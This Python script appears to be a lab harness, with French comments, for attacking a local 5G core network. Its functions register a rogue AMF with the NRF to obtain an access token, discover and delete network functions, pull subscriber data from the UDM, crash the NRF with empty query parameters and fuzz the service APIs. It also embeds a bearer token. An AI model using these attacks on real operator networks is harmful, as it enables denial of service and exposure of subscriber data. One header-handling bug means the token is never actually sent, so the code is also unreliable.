import requests
import json
import string 
import random

from src import *

import httpx

def request_cn(nf,data,method,uri,headers={},token="",display=True):

    url = f"http://127.0.0.1:{PORTS[nf]}" + uri

    base_headers = {
        # "Content-Type": "application/json", # géré tout seul par .post .get et le fait de mettre data= ou json=
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Authorization": f"Bearer {token}"  # Ajout de l'en-tête d'autorisation
    }

    base_headers.update(headers)
    method = method.upper()

    with httpx.Client(http1=False,http2=True, verify=False) as client:

        if method == "POST":
            response = client.request(method, url, data=data, headers=headers)
        else :
            response = client.request(method, url, json=data, headers=headers)

    try    : result = response.json()
    except : result = response.text

    # Afficher la réponse
    if display : 
        print("-----")
        print(f"Requête {method} {url}")
        print(f"-> Status Code {response.status_code}")
        print(result)

    return response.status_code, result

# OK
def ping_nf(nf):
    return request_cn(nf, {}, "GET","")

# OK
def add_nf(nf_instance_id, nf_type):
    data = {
        "nfInstanceId": nf_instance_id,
        "nfType": nf_type,
        "nfStatus": "REGISTERED"
    }
    return request_cn(
        "NRF", data, "PUT",
        f"/nnrf-nfm/v1/nf-instances/{nf_instance_id}"
    )

# OK
def get_token(nf_instance_id, nf_type, scope, target_type):
    data = {
        "grant_type": "client_credentials",
        "nfInstanceId": nf_instance_id,
        "nfType": nf_type,
        "scope": scope,
        "targetNfType" : target_type
    }
    status, token = request_cn("NRF", data, "POST", f"/oauth2/token")
    return token["access_token"]

# OK
def setup_rogue(nf_instance_id=generate_variables("uuid"), nf_type = "AMF"):
    add_nf(nf_instance_id, nf_type)
    scope       = "nnrf-disc"
    target_type = "NRF"
    return get_token(nf_instance_id, nf_type, scope, target_type)

# OK 
def get_nf_info(requester_nf_type, token, nf_type=None):
    # curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF&target-nf-type=UDM" 
    uri = f"/nnrf-disc/v1/nf-instances?requester-nf-type={requester_nf_type}"
    if nf_type : uri += f"&target-nf-type={nf_type}"
    return request_cn("NRF", {}, "GET", uri, token=token)

# OK
def remove_nf(nf_instance_id, token):
    # curl -s -o /dev/null -w "\n\nHTTP Status Code: %{http_code}\n\n" -X DELETE http://127.0.0.10:8000/nnrf-nfm/v1/nf-instances/$fakeAMF
    uri = f"/nnrf-nfm/v1/nf-instances/{nf_instance_id}"
    return request_cn("NRF", {}, "DELETE", uri, token=token)

# A TESTER (faut supi donc RAN)
def get_user_data(supi, token):
    # curl "http://127.0.0.3:8000/nudm-dm/v1/imsi-20893${subscriberID}/am-data?plmn-id=%7B%22mcc%22%3A%22208%22%2C%22mnc%22%3A%2293%22%7D"
    # https://jdegre.github.io/editor/?url=https://raw.githubusercontent.com/jdegre/5GC_APIs/master/TS29503_Nudm_SDM.yaml
    uri = f"/nudm-sdm/v2/{supi}/am-data"
    return request_cn("UDM", {}, "GET", uri, token=token)

# FIXED
def random_dump(token):
    # curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=$randomString&target-nf-type="
    random_string = generate_variables("string")
    return get_nf_info(random_string, token, "")

# FIXED
def crash_nrf(token):
    # curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=&target-nf-type="
    return get_nf_info("",token,"")

# A TESTER
def fuzz(token, nb_file=-1, nb_uri=-1, nb_ite=1, nb_method=1, nf_list=["UDM","NRF"], only_required=True):
    '''
        Check the documentation of a nf_list and send random requests with random (but accurate type) parameters
    '''

    random.shuffle(nf_list)
    for nf in nf_list:
        nf_file_name = "N" + nf.lower()
        files = [f for f in os.listdir(SOURCE_FOLDER) if nf_file_name in f]
        random.shuffle(files)

        for file in files[:nb_file] : 
            file_path = f"{SOURCE_FOLDER}/{file}"

            with open(file_path, 'r', encoding='utf-8') as f:
                yaml_content = yaml.safe_load(f)
                paths = yaml_content["paths"]
                uris  = list(paths.keys())
                random.shuffle(uris)

                for uri in uris[:nb_uri]:
                    methods = list(paths[uri].keys())
                    random.shuffle(methods)

                    for method in methods[:nb_method]:

                        header = {}
                        body   = {}

                        if 'parameters' in paths[uri][method] :
                            parameters = paths[uri][method]['parameters']
                            new_uri, header = extract_parameters(parameters, uri, file, only_required)

                        if 'requestBody' in paths[uri][method]:
                            body = paths[uri][method]['requestBody']['content']
                            accept, body = extract_body(body, file, only_required)

                        for _ in range(nb_ite):
                            print(f"{nf} {method} : {new_uri} (header : {header}, body : {body})")
                            request_cn(nf,body,method,new_uri,header,token=token)

# ---------

# nf_instance_id = generate_variables("uuid")
# token = setup_rogue(nf_instance_id)

# nf_instance_id = 'd69af192-c3cd-4363-98c5-330aada924e4'
# token = 'eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiIiLCJzdWIiOiJkNjlhZjE5Mi1jM2NkLTQzNjMtOThjNS0zMzBhYWRhOTI0ZTQiLCJhdWQiOiIiLCJzY29wZSI6Im5ucmYtZGlzYyIsImV4cCI6MTczNDYxMzU2NywiaWF0IjoxNzM0NjEyNTY3fQ.kYk3NB7eOSMjyAE_Gr_ipA5ihWqO7nLUTVYcRaDyuTPXO2mV-7iL36eKRbampO12Z6PCXM8LCAOOt_BLmAwuAD9-CSRpCK0EZOnkKjwZNkpJlQFe_CNd2d0afnCBuRsyzBwcIi1DwP1BFw9mocKe9z1WIlq7QgNvI-fbyOrk3KVzJ2MmF57Fu7qcXlrfEDc_vG9HhfmDg5Wn4OqPpPwEtHib-mWIdTgm4EY-nVWMq68c_BoLYvkfK2JsA7jps-suYs1wJi84Egng0UACgYc42Y4yAeDhmOL3S7AExULgomk0WdDBplXKsJ9LQeAzPE86cIq47_QNfbloErRz-aRr7A'

# get_nf_info("AMF", token, "UDM")
# code, result = remove_nf(nf_instance_id, token)
# if code == 204 : print("NF bien supprimée")
# crash_nrf(token)
# random_dump(token)

# fuzz(token)

# get_user_data(supi, token)


# print("----------")
# ping_nf("NRF")
